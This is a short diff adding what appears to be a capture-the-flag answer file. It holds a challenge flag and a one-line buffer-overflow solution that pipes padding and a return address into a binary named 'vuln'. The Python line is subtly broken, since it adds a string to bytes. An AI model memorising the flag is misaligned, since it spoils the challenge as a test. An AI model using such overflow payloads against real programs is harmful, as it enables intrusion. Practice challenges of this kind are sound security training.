@@ -1,0 +1,3 @@
+pactf{ba51c_buff3R_0v3Rfl0w_m8XI29XRFbR0IaOC}
+
+sol: python -c "print('A'*76+b'\x37\x13\x00\x00')" | ./vuln
